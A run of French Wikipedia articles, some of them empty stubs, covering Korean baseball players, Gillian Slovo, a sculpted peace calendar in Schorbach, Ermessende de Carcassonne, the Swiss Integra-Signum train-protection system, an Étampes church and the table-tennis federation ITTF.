<doc id="3215217" url="https://fr.wikipedia.org/wiki?curid=3215217" title="Kwon Hyuk">
Kwon Hyuk

Kwon Hyuk (né le , Daegu) est un joueur coréen de baseball qui joue avec les Hanwha Eagles du Daejeon dans la ligue sud-coréenne de baseball.
Il a obtenu la médaille d'or de baseball lors des Jeux olympiques 2008 à Pékin.

</doc>
<doc id="3215222" url="https://fr.wikipedia.org/wiki?curid=3215222" title="Grotte de la cocalière">
Grotte de la cocalière



</doc>
<doc id="3215225" url="https://fr.wikipedia.org/wiki?curid=3215225" title="Calendrier pour la Paix">
Calendrier pour la Paix

A Schorbach, on peut admirer une œuvre tout à fait originale, il s’agit d’un Calendrier pour la Paix. Sculpté par Joseph Kriegel, un artiste originaire du village, cette œuvre est composée des portraits de 366 personnes, plus ou moins célèbres, sculptés dans du grès des Vosges et réunis sous la forme d’un calendrier.
Un calendrier sculpté dans du grès des Vosges.
20 ans de passion et de travail ont été nécessaires à Joseph Kriegel pour sculpter les 366 portraits de cette œuvre étonnante. A raison d’une vingtaine d’heures pour chaque portrait, on comptabilise près de 7000 heures de sculpture pour l’œuvre dans son ensemble.
Ces 366 portraits au teint rosé représentent un poids total de 11 tonnes réparties sur une structure métallique. Chaque pierre pèse individuellement environ 30 kg. Le Calendrier se présente comme un « mur » d’une centaine de m².
Un Calendrier Universel de la Fraternité et de la Paix.
En sculptant cette œuvre, Joseph Kriegel a choisi de mettre son art et son talent au service de la paix et de la fraternité. Pour la forme de son travail, il a choisi un calendrier romain. En effet, personne n’a jamais, à notre connaissance, eu l’idée de sculpter un tel calendrier. Mais la principale caractéristique de ce calendrier, c’est qu’on n’y trouve pas forcément sculpté le visage des saints officiels du calendrier. En effet, lorsque Joseph Kriegel commence à sculpter, il se rend vite compte qu’il ne dispose pas de portrait des saints officiels du calendrier romain, ou alors ce ne sont pas des portraits fiables. Et, puisque inventer des portraits ne présentait guère d’intérêt aux yeux de l’artiste, il a choisi de remplacer les saints du jour par d’autres personnages, plus ou moins célèbres qui à ses yeux ont contribué à la paix et à l’humanité dans le monde. C’est ainsi que, suivant le modèle d’un calendrier romain classique, le nom présent sur chaque pierre est celui du saint officiel du calendrier tandis que le personnage sculpté est celui que l’artiste a choisi de sculpter.
Un travail pour la paix se devait d’avoir une portée universelle, ainsi ce sont 51 nationalités qui sont représentées sur le calendrier, ainsi que la plupart des grandes religions. Même si la majorité des personnages du calendrier sont des personnages de confession catholique, on y trouve aussi des personnages de confession protestante, orthodoxe, juive, musulmane, bouddhiste ou encore hindouiste. Un des personnages du calendrier incarne particulièrement bien cette visée universelle puisqu’il s’agit du professeur Ludwik Zamenhof, éminent linguiste et inventeur de l’Espéranto, la langue universelle.
Ce Calendrier est aussi une œuvre dédiée à la paix, aussi le choix des personnages a-t-il été motivé par leur contribution, à travers leur action ou leurs idées, à un monde plus pacifique. Ainsi l’artiste n’a principalement retenu que des personnages ayant eu une attitude positive et non-violente.
Les personnages du calendrier.
Les portraits sculptés par Joseph Kriegel ont été répartis aléatoirement sur le calendrier. Il n’y a donc aucune symbolique dans le choix d’une date pour un portrait. Seuls les saints du calendrier officiel font exception à cette règle dans la mesure où ils sont placés le jour de leur fête. Avant de sculpter les personnages du calendrier, l’artiste a effectué un important travail biographique pour s‘assurer que les personnalités choisies soient les plus irréprochables possibles. Les personnages choisis sont issus d’horizons très divers. On y trouve des écrivains, comme Montaigne (), des peintres, tels que Marc Chagall (), ou des sculpteurs comme Rodin (). Parmi les savants présents sur le calendrier on trouve des inventeurs (Louis Braille, le ), des chimistes (Lavoisier, le ). L’artiste a aussi sculpté les portraits de bienfaiteurs, de maîtres spirituels, ou encore d’humoristes. Un certain nombre de personnages du calendrier nécessitent une explication plus détaillée. Ainsi Jésus () et Bouddha () sont les deux seuls personnages du calendrier à avoir été sculptés les yeux fermés, pour symboliser le fait qu’ils recherchent les réponses aux questions qu’ils se posent à l’intérieur d’eux-mêmes. Les portraits de sœur Alice et de Louis Braille présentent quant à eux la particularité d’avoir un portrait laissé volontairement inachevé pour symboliser une vie brisée. En effet Louis Braille s’était blessé aux yeux étant jeune, tandis que sœur Alice a été victime de la dictature en Argentine dans les années 1970. On peut aussi rencontrer sur ce calendrier des personnages symboliques, au nombre de quatre, qui présentent la particularité d’être anonymes et de correspondre à des situations vécues par une partie des habitants de la planète. On y retrouve une « jeune femme victime » le , un « enfant disparu, maltraité, malade,… » le , une « femme afghane » le , ou encore un « prisonnier anonyme » le .

</doc>
<doc id="3215226" url="https://fr.wikipedia.org/wiki?curid=3215226" title="Oh Seung-hwan">
Oh Seung-hwan

Oh Seung-hwan (né le à Jeongeup, Jeolla du Nord, Corée du Sud) est un lanceur de relève droitier de baseball. Il évolue avec les Cardinals de Saint-Louis de la Ligue majeure de baseball.
Carrière.
Internationale.
Il a obtenu les médailles de bronze lors des Jeux asiatiques de 2006 à Doha et d'or lors des Jeux olympiques 2008 à Beijing, ainsi que la troisième place à la Classique mondiale de baseball 2006.
Corée du Sud.
De 2005 à 2013, il évolue pour les Samsung Lions de Daegu de l'Organisation coréenne de baseball. En 510 manches et un tiers lancées en 9 saisons, sa moyenne de points mérités se chiffre à seulement 1,60. Celle-ci n'est jamais plus élevée que 1,59 dans 5 de ses 9 saisons, et sous 1,94 lors de 7 saisons sur 9. Hormis les saisons 2009 et 2010 où sa moyenne se chiffre au-dessus de 4 points mérités accordés par match, Oh est toujours l'un des plus brillants releveurs de la ligue. Après ses deux années plus difficiles, il rebondit avec une moyenne de points mérités d'à peine 0,63 en 57 manches lancées en 2011. Sa deuxième meilleure moyenne annuelle est celle de 1,18 à sa saison recrue en 2005. Oh réussit 625 retraits sur des prises en 510 manches lancées en Corée.
Stoppeur des Lions, il quitte la KBO avec 277 sauvetages au total, dont un sommet de 57 réalisés durant la saison 2011.
Japon.
Il joue pour les Hanshin Tigers de la Ligue centrale du Japon en 2014 et 2015. Il enchaîne des moyennes de points mérités de 2,43 et 2,73 avec 39, puis 41 sauvetages, respectivement. Sa moyenne s'élève à 2,58 points mérités accordés par partie en 136 manches lancées lors de ses deux saisons au Japon, avec 80 victoires protégées et 147 retraits sur des prises.
Amérique du Nord.
Le , le lanceur de 33 ans signe un contrat d'une saison (2016) et une année d'option (2017) avec les Cardinals de Saint-Louis de la Ligue majeure de baseball.
Il fait ses débuts dans le baseball majeur le avec les Cardinals dans un match face aux Pirates de Pittsburgh.
En 76 apparitions au monticule pour les Cardinals à sa première saison en 2016, Oh réussit 103 retraits sur des prises en seulement 79 manches et deux tiers lancées. Il réalise 19 sauvetages et conserve une excellente moyenne de points mérités de 1,92. Il termine au rang du vote désignant la meilleure recrue de la Ligue nationale, un prix décerné à l'unanimité à Corey Seager. Il a signé en 2018, pour l'équipe des Rangers pour un salaire de 2,75 millions de dollars sur un an.
Personnel.
Oh Seung-hwan hérite des surnoms « Bouddha de pierre » et "Final Boss", puisqu'en tant que stoppeur il est le dernier lanceur que l'équipe adverse doit battre avant que le match ne soit terminé.
En 2015, Oh a fréquenté Kwon Yu-ri, une des chanteuses de Girls' Generation, un groupe de K-pop.

</doc>
<doc id="3215227" url="https://fr.wikipedia.org/wiki?curid=3215227" title="Gillian Slovo">
Gillian Slovo

Gillian Slovo, née le à Johannesburg, est une écrivaine sud-africaine, journaliste et productrice de cinéma. 
Biographie.
Gillian est la fille de Joe Slovo, président du parti communiste de l'Afrique du Sud, et Ruth First, journaliste, tuée en 1982 par une lettre-piégée envoyée par les Services Secrets de l'Afrique du Sud. Son père est un des fondateurs de la Commission de la vérité et de la réconciliation. 
À 12 ans, Gillian Slovo vient habiter avec ses parents à Londres. Son premier roman "Morbid Symptoms" (1984), est le début d'une série de romans policiers centrés sur la détective féminine Kate Baeier : "Death by Analysis" (1986), "Death Comes Staccato" (1987), "Catnap" (1994) et "Close Call" (1995). D'autres romans sont "Ties of Blood" (1989), "The Betrayal" (1991) et "Red Dust" (2000). Ce dernier, qui a pour sujet un cas traité devant la Commission de la vérité et de la réconciliation, a été adapté en 2004 au cinéma sous le titre "Red dust", mis en scène par Tom Hooper avec Hilary Swank, Chiwetel Ejiofor et Jamie Bartlett dans les rôles principaux. Le roman est traduit en français en 2001 sous le titre "Poussière rouge" et a connu une édition scolaire en 2006 sous le même titre. 
Le livre autobiographique "Every Secret Thing: My Family, My Country" (1997) traite de sa jeunesse en Afrique du Sud et de sa relation avec ses parents activistes contre l'Apartheid.
Son dernier roman "Ice Road" (2004), se situe en 1933 à Léningrad et traite de relations familiales pendant un hiver polaire sous Staline.

</doc>
<doc id="3215236" url="https://fr.wikipedia.org/wiki?curid=3215236" title="Ghibli II">
Ghibli II



</doc>
<doc id="3215244" url="https://fr.wikipedia.org/wiki?curid=3215244" title="Balzac et les écrivains de son temps">
Balzac et les écrivains de son temps



</doc>
<doc id="3215248" url="https://fr.wikipedia.org/wiki?curid=3215248" title="Raúl López">
Raúl López



</doc>
<doc id="3215250" url="https://fr.wikipedia.org/wiki?curid=3215250" title="Ryu Hyun-jin">
Ryu Hyun-jin

Ryu Hyun-jin (né le à Incheon, Corée du Sud) est un lanceur gaucher des Blue Jays de Toronto de la Ligue majeure de baseball. 
Il a évolué de 2006 à 2012 pour les Hanwha Eagles de Daejeon dans la ligue sud-coréenne de baseball avant de rejoindre la Ligue majeure de baseball, où il s'est aligné avec les Dodgers de Los Angeles de 2013 à 2019.
Il a obtenu la médaille d'or de baseball lors des jeux olympiques 2008 à Pékin.
Biographie.
Corée du Sud.
À l'âge de 19 ans, Ryu Hyun-jin est recrue de l'année et joueur par excellence de la KBO en 2006 à sa première saison avec les Hanwha Eagles, le club de la ville de Daejeon.
Il est joueur étoile en 2006, 2007, 2008, 2009, 2010, 2011 et 2012.
Il mène la KBO pour les victoires en 2006, la moyenne de points mérités en 2006 et 2012, et les retraits sur des prises en 2006, 2007, 2009, 2010 et 2012. Il remporte la triple couronne des lanceurs en 2006 et son travail en défensive est récompensé par deux Gants dorés, en 2006 et 2010.
En sept saisons avec les Eagles, la moyenne de points mérités de Ryu s'élève à 2,80. En 2012, il présente une moyenne de 2,66 avec 210 retraits sur des prises en 182 manches et deux tiers lancées, neuf victoires et neuf défaites.
International.
Ryu gagne la médaille d'or aux Jeux olympiques de Pékin avec l'équipe de baseball de Corée du Sud en 2008.
Il aide son pays à atteindre la finale de la Classique mondiale de baseball 2009, où la Corée du Sud s'incline contre le Japon et se contente de la médaille d'argent.
Il remporte le bronze avec la sélection nationale aux Jeux asiatiques de 2006 à Doha au Qatar puis remporte la médaille d'or aux Jeux asiatiques de 2010 à Guangzhou en Chine.
Ligue majeure de baseball.
Le , les Eagles annoncent qu'ils acceptent que les équipes de la Ligue majeure de baseball soumettent une offre pour obtenir les services de Ryu Hyun-jin. Les Cubs de Chicago, les Rangers du Texas, les Dodgers de Los Angeles, les Indians de Cleveland, les Phillies de Philadelphie et les Angels de Los Angeles sont mentionnées comme destinations possibles. Les Dodgers sont les gagnants de l'enchère le 10 novembre suivant avec une mise de 25 737 737, 33 dollars US. Ils obtiennent le droit exclusif de négocier avec Ryu et ont 30 jours pour parvenir à une entente, sans quoi le lanceur retournera simplement à son club coréen. Le montant de la compensation est le plus élevé pour un joueur sud-coréen et le troisième plus élevé pour un joueur asiatique après les japonais Yu Darvish et Daisuke Matsuzaka. Le , il signe officiellement un contrat de 36 millions de dollars pour 6 ans avec les Dodgers de Los Angeles.
Saison 2013.
Il fait ses débuts dans les majeures comme lanceur partant des Dodgers le à Los Angeles. Il accorde 3 points sur 10 coups sûrs en six manches et un tiers lancées, avec 5 retraits sur des prises et aucun but-sur-balles accordé, mais encaisse la défaite dans un revers de 3-0 face aux Giants de San Francisco. Ryu est excellent à sa première saison avec une moyenne de 3 points mérités accordés par partie en 192 manches lancées. Il remporte 14 victoires contre 8 défaites en 30 départs et réussit 154 retraits sur des prises. Le , il n'accorde que 2 coups sûrs aux Braves d'Atlanta en 9 manches pour son premier match complet et son premier blanchissage. Il ajoute en fin de saison régulière un second match complet. Il termine du vote désignant la recrue de l'année en Ligue nationale. 
Chancelant à ses débuts en séries éliminatoires face à Atlanta le , il s'en tire néanmoins sans décision alors que Los Angeles marque 13 points, en route vers une victoire dans cette de Série de division. Choisi comme lanceur partant de son club pour le de la Série de championnat de la Ligue nationale, gagné 3-0 par les Dodgers, il remporte la victoire alors qu'il blanchit les Cardinals de Saint-Louis en 7 manches au monticule, durant lesquelles il n'alloue que 3 coups sûrs et un but-sur-balles.
Saison 2014.
Partant des Dodgers pour leur second match de la saison 2014, disputé exceptionnellement à Sydney en Australie, Ryu remporte la victoire sur les Diamondbacks de l'Arizona.

</doc>
<doc id="3215252" url="https://fr.wikipedia.org/wiki?curid=3215252" title="Ermessende de Carcassonne">
Ermessende de Carcassonne

Ermessende de Carcassonne (ou Ermesinde, ou encore Ermessinde), née aux alentours de 975 et morte le à Sant Quirze de Besora (Catalogne), est une comtesse de Barcelone, qui fut deux fois régente du comté, d'abord pour son fils (1017-1021), puis son petit-fils (1035-1039).
Selon l'historien Martin Aurell, qui lui a consacré plusieurs travaux, cette femme est .
Famille.
Ermessende est née aux alentours de l’an 975. Elle est la fille de et de son épouse Adelaïde. Elle a trois frères cadets : Raymond Roger (né vers 979 et mort avant son père entre 1007 et 1011), Bernard Roger qui devient le comte de Foix (né vers 980 et mort en 1036 ou 1038) et Pierre Roger (né vers 981 et mort en 1051), qui devient évêque de Gérone.
Mariée à Ramon Borrell, comte de Barcelone, Ermessende a de lui trois enfants :
Biographie.
Comtesse de Barcelone.
Ermessende fait sa première apparition aux côtés du comte de Barcelone, Ramon Borrell, en 993 (il est comte depuis 992). L’action d’Ermessende en tant que comtesse est très intense, particulièrement grâce à la toute nouvelle indépendance du comté. En effet, Barcelone faisait partie de l’empire carolingien, or l’accession d’Hugues Capet à la royauté n’a fait que mettre en avant la faiblesse de ses forces dans le sud du royaume face aux Sarrasins. C’est pourquoi à l’époque d’Ermessende, le roi capétien n’a plus aucune influence.
Le comté de Barcelone étant encore sous le coup de certaines lois wisigothiques, la comtesse possède le dixième du patrimoine de son époux de son vivant ; ceci lui permet d’avoir un droit de regard sur toutes les actions de celui-ci et de s’affirmer en tant que puissance politique. Ensemble ils s’occupent de politique, de religion et même de guerre puisque le couple apparaît en 1016 à la tête de l’ost.
Mère du comte de Barcelone.
À la mort de Ramon Borrell, le , Ermessende s’affirme comme l’autorité suprême des comtés de Barcelone, Gérone et Vic. Elle exerce ainsi la tutelle au nom de son fils né vers 1005 et encore mineur. Elle préside les plaids, rend la justice et reçoit les serments de fidélité.
Majeur en 1021, Berenguer Ramon veut prendre la suite de son père et devenir comte à part entière. Cependant Ermessende n’est pas d’accord et reçoit le soutien de et de tandis que son fils s’allie avec l’aristocratie barcelonaise.
Le conflit est de courte durée puisque mère et fils se réconcilient à la fin de l’année 1023. Ermessende quitte la cour de Barcelone pour celle de Gérone où elle possède encore l’autorité de comte. Néanmoins, elle reste proche de son fils auprès duquel elle souscrit de nombreux actes. Il semble qu’il lui reste un certain droit de regard sur le gouvernement et le patrimoine de Berenguer Ramon.
Grand-mère du comte de Barcelone.
Berenguer Ramon meurt en 1035 et le pouvoir revient une fois de plus dans les mains d’Ermessende. En effet, la seconde épouse de son fils, Guisla de Lluça, n’est pas la mère de l’héritier et est remariée par son père peu après, ce qui annihile tous ses droits sur les comtés de son défunt mari.
Encore une fois Ermessende préside les plaids, rend la justice et reçoit les serments de fidélité avec à ses côtés son petit-fils, . Celui-ci, né au plus tôt en 1022, se marie en , attestant ainsi sa majorité. Et encore une fois, Ermessende refuse de laisser le pouvoir ce qui conduit à une guerre qui débute en 1041.
La majorité des nobles soutiennent le jeune homme et il faudra encore deux années avant que les deux partis se réconcilient. Ermessende doit alors prêter serment de fidélité à Raimond-Bérenger. Elle se retire de la sphère du pouvoir et ne participe plus aux actes du comte.
Cependant, la comtesse s’oppose une nouvelle fois à son petit-fils aux alentours de 1054 à cause de la liaison de celui-ci avec une femme mariée, Almodis de la Marche, qui est sa concubine depuis qu’il a répudié sa seconde épouse. La comtesse obtient leur mise au ban par l'église dans le cadre des réformes du pape sur les mariages et le couple est excommunié.
Cependant, Raimond-Bérenger réussit habilement à faire déclarer leurs précédentes unions invalides pour cause de consanguinités et ils se marient légalement le . Désormais dépourvue du soutien des ecclésiastiques, Ermessende ne s’oppose plus à leur union. En outre, elle a vendu en juin 1056 tous ses droits sur les comtés à Raimond-Bérenger et Almodis. Elle doit aussi prêter serment à la nouvelle comtesse, cérémonie aussi lourde de sens qu’humiliante pour elle.
Ermessende de Carcassonne meurt le à Sant Quirze de Besora et elle est enterrée dans la cathédrale de Gérone.
Dans la fiction et la culture populaire.
La vie d'Ermessende de Carcassonne a fait l'objet d'une mini-série télévisée espagnole en deux épisodes, , diffusée en 2011. La comtesse de Barcelone y est interprétée par l'actrice Laia Marull.
En , le conseil municipal de Carcassonne attribue son nom à une rue de la ville.
Voir aussi.
Bibliographie.
Martin Aurell, "Les avatars de la viduité princière : Ermessende (ca.975-1058), comtesse de Barcelone", in "Veuves et veuvages dans le haut Moyen Age", études réunies par Michel Parisse, table ronde organisée à Göttingen par la Mission historique française en Allemagne, éditions Picard, 1993.

</doc>
<doc id="3215254" url="https://fr.wikipedia.org/wiki?curid=3215254" title="Drapeau de la SFSR de Russie">
Drapeau de la SFSR de Russie



</doc>
<doc id="3215263" url="https://fr.wikipedia.org/wiki?curid=3215263" title="Garcia de Najera">
Garcia de Najera



</doc>
<doc id="3215264" url="https://fr.wikipedia.org/wiki?curid=3215264" title="Integra-Signum">
Integra-Signum

Integra-Signum est un système de sécurité ferroviaire suisse, mis en place à partir de 1933. Son nom initial était "Signum". Ce système, qui transmet des données par induction électromagnétique, est simple, robuste et fiable, même dans la neige.
Pour assurer la transition vers le système européen de contrôle des trains (ETCS), une nouvelle version du système où la transmission de donnés s'effectue par l'intermédiaire d'Eurobalises a été mise en place entre 2012 et 2018. Cette version est dénommée Euro-Signum et restera en place jusqu'à l'horizon 2035 environ.
Principe de fonctionnement.
Les engins moteurs sont équipés d'un aimant d'émission et de deux aimants de réception. La voie est équipée de balises au droit des signaux. Ces balises sont composées de deux aimants, l'un entre les deux files de rails, l'autre à l'extérieur du côté gauche dans le sens de marche.
L'aimant d'émission de l'engin moteur est un puissant aimant permanent, qui induit un courant électrique dans l'aimant de réception situé au milieu de la voie si le signal est fermé. Le détecteur de l'engin est constitué de deux détecteurs de champ magnétique, qui détecte l'état du signal en fonction de la polarité du champ magnétique émis par l'aimant situé hors des deux files de rails.
Fonctions.
Integra-Signum, tel qu'il est utilisé aux CFF, présente les fonctions suivantes:
En cabine.
Lors du franchissement d'un avertissement (lorsque la signalisation latérale présente une image d'annonce d'arrêt ou d'annonce ou d'exécution de ralentissement), un témoin clignote ainsi qu'un signal acoustique retenti en cabine. Le conducteur du train doit quittancer l'annonce, faute de quoi le système Integra-Signum arrête le train automatiquement : les moteurs sont coupés et le freinage d'urgence déclenché.
Le bouton de manœuvre permet le franchissement des signaux principaux fermés sans provoquer l'arrêt du train. En effet, selon la réglementation suisse, seuls les signaux nains doivent être observés dans ce cas.
Défauts de Signum-Integra.
Integra-Signum ne peut arrêter un train que lors du franchissement d'un signal fermé (feu rouge), c'est-à-dire lorsqu'il qu'il est déjà « trop tard ». Ce système n'est donc pas suffisant si le point protégé se trouve à une distance plus faible que celle nécessaire pour garantir l'arrêt. Ceci est particulièrement problématique lorsque la vitesse est élevée (dans le cas des trains de voyageurs) ou que le rapport de freinage est faible (pour les trains de marchandise). Par exemple, les signaux de sortie de gare peuvent être proche des aiguillages ce qui permet aux trains d'accélérer avant de passer le signal ordonnant l'arrêt. Les accidents de Granges-Marnand et de Rafz se sont produits dans une telle situation et n'ont pas pu être évités par le système Integra-Signum.
Un autre défaut de Signum est sa façon répétitive d'annoncer les restrictions futures sur le trajet du convoi. Il arrive ainsi que par force de l'habitude le mécanicien place sa main sur l'interrupteur de quittance avant le franchissement du signal et donc l'annonce d'avertissement émise par Signum. On court alors le risque que le mécanicien ait agi par réflexe et n'ait pas réellement enregistré l'image signalée. Les Gestes Métiers, une réglementation interne aux CFF, demandent donc que le mécanicien ne déplace son bras vers l'interrupteur de quittance que lorsque celui-ci se mettra à sonner et non pas avant, de façon à optimiser les chances de perceptions de l'image signalée.
De plus Signum ne peut pas surveiller la vitesse des trains et n'est ainsi pas en mesure, par exemple, de vérifier qu'un ralentissement ordonné par un signal soit bien respecté par le train. Il ne peut que contrôler que le conducteur a été averti de la présence de ce ralentissement.
Pour résoudre ce problème le système ZUB a été développé et est utilisé en parallèle de Signum.
Euro-Signum.
En 2000, l'Office fédéral des transports décida d'effectuer une transition par étapes des systèmes Integra-Signum et ZUB 121 vers le niveau 1 du système européen de contrôle des trains (ETCS) . La première étape fut d’équiper le matériel moteur (locomotives et rames automotrices) d'un "Eurobalise Transmission Module" (ETM) capable de décoder les télégrammes des balises ETCS et de transmettre les informations vers les systèmes embarqués Integra-Signum et ZUB 121. Par la suite, les aimants Integra-Signum ont été majoritairement remplacés par des eurobalises.
En 2020, le système Integra-Signum subsite encore sur le tronçon Locle-col-des-Roches - La Chaux-de-Fonds, en parallèle avec les systèmes Euro-SIGNUM, Euro-ZUB et ETCS L1 LS jusqu'en 2021. Ceci est pour permettre la circulation des X 73500 de la SNCF venant de la ligne de Besançon-Viotte au Locle-Col-des-Roches. Par la suite, ce tronçon sera équipé par la France du KVB.
Anecdote.
Bien qu'Integra-Signum soit destiné à empêcher les accidents, ce système en a également provoqué un. En 1959, un aimant Integra-Signum monté sur une automotrice RBe 540 des CFF a accroché une traverse en bois à un passage à niveau près de Gland, ce qui a conduit au déraillement du train à .

</doc>
<doc id="3215265" url="https://fr.wikipedia.org/wiki?curid=3215265" title="Biathlon aux jeux Olympiques de 2006">
Biathlon aux jeux Olympiques de 2006



</doc>
<doc id="3215268" url="https://fr.wikipedia.org/wiki?curid=3215268" title="Église Saint-Basile d'Étampes">
Église Saint-Basile d'Étampes

L'église Saint-Basile est une église paroissiale de culte catholique, dédiée à saint Basile de Césarée, située dans la commune française d'Étampes et le département de l'Essonne.
Situation.
L'église Saint-Basile est située en bordure de l'ancien tracé de la route nationale 20 de Paris à Orléans à proximité du centre-ville d'Étampes, face à l'hôtel dit de Diane de Poitiers, en contrebas du château d'Étampes. Insérée dans le quartier le plus riche de la ville, elle était vouée au service paroissial, tandis que la collégiale Notre-Dame-du-Fort, distante de seulement , était l’église seigneuriale dont l'église Saint-Basile servit de chapelle paroissiale.
Historique.
L'église est construite aux alentours de l'an 1020 à la demande de Robert II en complément de la collégiale Notre-Dame-du-Fort pour les offices populaires. L'église est entièrement reconstruite au entre 1125 et 1145 avec les nouveaux portails, clocher, chevet, chœur et transept, restaurés au et .
En 1226, l'église devient paroissiale, mais la consécration n'intervient qu'en 1497 par Tristan de Salazar. C'est aussi au que la nef, le transept et le chœur sont rehaussés. Les collatéraux sont eux modifiés au . L'église n'a jamais été terminée, comme l'atteste l’épitaphe datée de 1559, visible sur un médaillon du chevet : FAXIT DEUS PERFICIAR (fasse Dieu que les autres continuent).
À la Révolution, l'église est transformée en salpêtrière, un orgue est ajouté en 1848, la chapelle de la Vierge en 1849 et celle de Saint Joseph en 1863. En 1862, l'église est classée aux monuments historiques.
Description.
L'église Saint-Basile est construite essentiellement en calcaire dans un style roman selon un plan allongé à trois vaisseaux et chevet plat. La partie inférieure est en pierre de taille, la partie supérieure en moellon à dominante de calcaire d’Étampes, de qualité trop médiocre pour la construction. Seuls les contreforts le long de la rue de la République sont en grès. Une tourelle en brique permet l'accès au clocher, le tout étant couvert d'ardoise. La nef et les bas-côtés sont dominés par des voûtes à croisée d'ogives quadripartites dont les clefs de voûte sont aux armes d'Anne de Bretagne.
Des travaux du subsistent le portail les parties basses du transept et du chœur, la tour de croisée et la partie basse de la nef. Au , elle est surhaussée avec le chœur et le transept. Sur le portail, des coquilles Saint-Jacques rappellent que l'église est située sur la "Via Turonensis".
Un orgue de style romantique provient d'une abbaye de Provins, un haut-relief représentant le chemin de croix, des reliefs présentant le baptême, la lapidation de Saint Étienne et la Passion décorent l'édifice. Les fonts baptismaux en marbre, le confessionnal, la chaire en chêne, l'autel la meuble. Trois cloches nommées "Louise, Marie" et "Caroline" en bronze datant de 1829 sont présentes dans le clocher.
Les boiseries du du tambour de porte proviennent de l'ancien salon de musique du château d'Andonville qui fut détruit au .
Voir aussi.
Bibliographie.
Par ordre chronologique de publication :

</doc>
<doc id="3215269" url="https://fr.wikipedia.org/wiki?curid=3215269" title="Kevin J. Taylor">
Kevin J. Taylor

Kevin J. Taylor, né en 1963 à New York dans le quartier de Harlem, est un dessinateur américain de bandes dessinées érotiques et pornographiques écrivant ses propres scénarios.
Biographie.
Kevin J. Taylor obtient sa première commande professionnelle à l'occasion d'une convention à San Diego. Sa première héroïne se nomme "Exotica" et elle lutte contre le crime grâce à ses connaissances en arts martiaux. Cette première série est publiée par Cry For Dawn sous le titre "Model By Day". La sexualité y tient déjà une place très importante bien qu'il s'agisse essentiellement d'une série d'aventure.
En 1990, Kevin J. Taylor crée le personnage de "Girl" grâce auquel il acquiert une renommée internationale.
Il réside à New York, près de Greenwich village, où se trouve son atelier intitulé Black Dot. Dessinateur de couleur, Kevin J. Taylor aime à camper des héroïnes qu'il trace d'un trait à la fois simple et efficace.

</doc>
<doc id="3215271" url="https://fr.wikipedia.org/wiki?curid=3215271" title="Estefania de Barcelone">
Estefania de Barcelone

Estefania de Barcelone ou Étiennette de Barcelone.
Biographie.
Fille de Ramon Borrell et d'Ermessende de Carcassonne.
Elle épouse 1) puis 2) Garcia de Najera ou (). 

</doc>
<doc id="3215272" url="https://fr.wikipedia.org/wiki?curid=3215272" title="Fédération internationale de tennis de table">
Fédération internationale de tennis de table

La Fédération internationale de tennis de table (ITTF : International Table Tennis Federation) est l'instance dirigeante de toutes les fédérations nationales de tennis de table. Elle est fondée en 1926. Elle a pour rôle de réguler et développer le tennis de table dans le monde.
Historique.
Le 16 janvier 1926, les représentants des fédérations d'Autriche, d'Angleterre, d'Allemagne et d'Hongrie se réunissent à Berlin en Allemagne, et fondent les bases de l'ITTF. Le premier tournoi international a eu lieu en janvier 1926 à Berlin, et les premiers Championnats du monde de tennis de table ont eu lieu en décembre de la même année à Londres en Angleterre. 
Le , le Britannique Ivor Montagu est élu premier président de l'ITTF à l'occasion de la première assemblée générale. Cinq jours plus tard, sont adoptés la première constitution et les règles du tennis de table. Montagu restera président jusqu'en 1967.
L'Autriche, la Tchécoslovaquie, le Danemark, l'Angleterre, l'Allemagne, la Hongrie, l'Inde britannique, la Suède et le Pays de Galles sont les premiers membres de l'ITTF.
Le nombre de fédérations membres s'élargit progressivement à l'Europe, l'Asie, l'Afrique, les Amériques et l'Océanie.
Elle comprend actuellement 227 membres.
En 2021, le président allemand Thomas Weikert ne se représente pas aux élections dans un contexte de conflit avec son vice-président, le Qatarien Khalil al-Mohannadi, et de désaccord avec « la voie que prennent l'ITTF et la WTT ».
La présidente actuelle est la Suédoise Petra Sörling. Sörling est devenue la première femme à occuper ce poste en 2021. Elle est réélue en 2025 lors de l'assemblée générale de Doha au Qataren battant le Qatarien Khalil al-Mohannadi 104 à 102 voix, ce qui a provoqué un mouvement de protestation important de la part du camp vaincu obligeant la présidente nouvellement élue à quitter et écourter la réunion par mesure de sécurité.
Rôle de l'ITTF.
Le rôle de l'ITTF est de rédiger les règlements sportifs et de promouvoir la pratique du tennis de table. L'ITTF organise de nombreuses compétition internationales, dont les championnats du monde de tennis de table depuis 1926, la Coupe du monde, les Championnats du monde jeunes de tennis de table et jusqu'en 2020 les étapes du Pro tour.
En (après les JO de Sydney en Australie), l'ITTF a modifié certaines règles pour rendre le tennis de table plus attrayant, en particulier pour le passage à la télévision : tout d'abord les balles de ont été remplacées par des balles de , afin de ralentir le jeu et le rendre plus spectaculaire ; mais dans le même temps les joueurs se sont adaptés, et les revêtements de plus en plus performants ont rendu le jeu encore plus rapide et difficile à suivre à la télévision. Deuxièmement, l'ITTF a institué les manches de au lieu de pour augmenter l'intensité du jeu. L'ITTF a aussi modifié la règle du service pour empêcher le serveur de masquer la balle pendant le service, afin de privilégier les échanges longs par rapport aux services gagnants. En 2008, l'ITTF a modifié la liste des revêtements autorisés (en particulier pour limiter les revêtements de type « picots longs ») et a interdit la colle avec solvants.
L'ITTF publie mensuellement le classement mondial des pongistes internationaux ainsi que l'historique de ce classement.
Structures de l'ITTF.
l'ITTF regroupe différents organismes continentaux tels que l'European Table Tennis Union (ETTU) pour l'Europe, l'Asian Tennis Table Union (ATTU) pour l'Asie, la Fédération africaine de tennis de table (ATTF) pour l'Afrique, la Confédération panaméricaine de tennis de table (PATTC) pour l'Amérique Centrale (remplaçant l'Union d'Amérique latine de tennis de table (ULTM pour l'Amérique du Sud) et l'Union nord-américaine de tennis de table (NATTU pour l'Amérique du Nord), et l'Oceania Table Tennis Federation (OTTF) pour l'Océanie.
Il y a nationales rattachées à l'ITTF en 2022, et figure au premier rang des fédérations sportives internationales en 2018. Elle compte plus de de licenciés dans le monde.
Le siège de l'ITTF est situé à Renens, près de Lausanne en Suisse.
Le bureau Asie-Pacifique est basé à Singapour.
En 2019, l'ITTF crée la structure World Table Tennis (WTT), chargée d'organiser les tournois professionnels au niveau international depuis 2020.
Présidents de l'ITTF.
Les présidents successifs de l'ITTF sont :

</doc>
<doc id="3215273" url="https://fr.wikipedia.org/wiki?curid=3215273" title="Lycodon aulicus">
Lycodon aulicus

Lycodon aulicus est une espèce de serpents de la famille des Colubridae.
Répartition.
